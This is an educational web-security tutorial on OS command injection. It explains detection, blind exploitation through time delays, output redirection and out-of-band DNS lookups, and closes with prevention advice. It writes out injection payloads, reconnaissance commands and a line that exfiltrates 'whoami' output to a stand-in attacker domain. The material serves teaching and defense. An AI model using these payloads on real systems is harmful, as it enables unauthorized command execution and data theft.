1. [Web Security Academy](/web-security)  
2. [OS command injection](/web-security/os-command-injection)  
  
# OS command injection  
  
In this section, we explain what OS command injection is, and describe how vulnerabilities can be detected and exploited. We also show you some useful commands and techniques for different operating systems, and describe how to prevent OS command injection.   
![OS command injection](os-command-injection.svg)  
  
#### Labs  
  
If you're familiar with the basic concepts behind OS command injection vulnerabilities and want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access labs in this topic from the link below.   
  
1. [View all OS command injection labs](/web-security/all-labs#os-command-injection)  
  
## What is OS command injection?  
  
OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.   
  
## Injecting OS commands  
  
In this example, a shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL:   
`https://insecure-website.com/stockStatus?productID=381&storeID=29`  
To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:   
`stockreport.pl 381 29`  
This command outputs the stock status for the specified item, which is returned to the user.   
The application implements no defenses against OS command injection, so an attacker can submit the following input to execute an arbitrary command:   
`& echo aiwefwlguh &`  
If this input is submitted in the `productID` parameter, the command executed by the application is:   
`stockreport.pl & echo aiwefwlguh & 29`  
The `echo` command causes the supplied string to be echoed in the output. This is a useful way to test for some types of OS command injection. The `&` character is a shell command separator. In this example, it causes three separate commands to execute, one after another. The output returned to the user is:   
`Error - productID was not provided aiwefwlguh 29: command not found`  
The three lines of output demonstrate that:   
  
1. The original `stockreport.pl` command was executed without its expected arguments, and so returned an error message. 
2. The injected `echo` command was executed, and the supplied string was echoed in the output. 
3. The original argument `29` was executed as a command, which caused an error.   
Placing the additional command separator `&` after the injected command is useful because it separates the injected command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing.   
LAB  
APPRENTICE [OS command injection, simple case](/web-security/os-command-injection/lab-simple)  
  
## Useful commands  
  
After you identify an OS command injection vulnerability, it's useful to execute some initial commands to obtain information about the system. Below is a summary of some commands that are useful on Linux and Windows platforms:   
Purpose of command  |  Linux  |  Windows   
---|---|---  
Name of current user  | ` whoami ` | ` whoami `  
Operating system  | ` uname -a ` | ` ver `  
Network configuration  | ` ifconfig ` | ` ipconfig /all `  
Network connections  | ` netstat -an ` | ` netstat -an `  
Running processes  | ` ps -ef ` | ` tasklist `  
  
## Blind OS command injection vulnerabilities  
  
Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.   
As an example, imagine a website that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the `mail` program with the submitted details:   
`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`  
The output from the `mail` command (if any) is not returned in the application's responses, so using the `echo` payload won't work. In this situation, you can use a variety of other techniques to detect and exploit a vulnerability.   
  
### Detecting blind OS command injection using time delays  
  
You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond. The `ping` command is a good way to do this, because lets you specify the number of ICMP packets to send. This enables you to control the time taken for the command to run:   
`& ping -c 10 127.0.0.1 &`  
This command causes the application to ping its loopback network adapter for 10 seconds.   
LAB  
PRACTITIONER [Blind OS command injection with time delays](/web-security/os-command-injection/lab-blind-time-delays)  
  
### Exploiting blind OS command injection by redirecting output  
  
You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location `/var/www/static`, then you can submit the following input:   
`& whoami > /var/www/static/whoami.txt &`  
The `>` character sends the output from the `whoami` command to the specified file. You can then use the browser to fetch `https://vulnerable-website.com/whoami.txt` to retrieve the file, and view the output from the injected command.   
LAB  
PRACTITIONER [Blind OS command injection with output redirection](/web-security/os-command-injection/lab-blind-output-redirection)  
  
### Exploiting blind OS command injection using out-of-band (OAST) techniques  
  
You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:   
`& nslookup kgji2ohoyw.web-attacker.com &`  
This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.   
LAB  
PRACTITIONER [Blind OS command injection with out-of-band interaction](/web-security/os-command-injection/lab-blind-out-of-band)  
The out-of-band channel provides an easy way to exfiltrate the output from injected commands:   
`& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`  
This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:   
`wwwuser.kgji2ohoyw.web-attacker.com`  
LAB  
PRACTITIONER [Blind OS command injection with out-of-band data exfiltration](/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)  
  
## Ways of injecting OS commands  
  
You can use a number of shell metacharacters to perform OS command injection attacks.   
A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:   
  
1. `&`
2. `&&`
3. `|`
4. `||`  
The following command separators work only on Unix-based systems:   
  
1. `;`
2. Newline (`0x0a` or `\n`)   
On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:   
  
1. ``` injected command ```
2. `$(` injected command `)`  
The different shell metacharacters have subtly different behaviors that might change whether they work in certain situations. This could impact whether they allow in-band retrieval of command output or are useful only for blind exploitation.   
Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command.   
  
## How to prevent OS command injection attacks  
  
The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In almost all cases, there are different ways to implement the required functionality using safer platform APIs.   
If you have to call out to OS commands with user-supplied input, then you must perform strong input validation. Some examples of effective validation include:   
  
1. Validating against a whitelist of permitted values. 
2. Validating that the input is a number. 
3. Validating that the input contains only alphanumeric characters, no other syntax or whitespace.   
Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.   
  
#### Read more

1. [Find OS command injection vulnerabilities using Burp Suite's web vulnerability scanner](/burp/vulnerability-scanner)
2. [Read PortSwigger Research's writeup of the Hunting Asynchronous Vulnerabilities presentation from 44Con and BSides Manchester](https://portswigger.net/research/hunting-asynchronous-vulnerabilities)
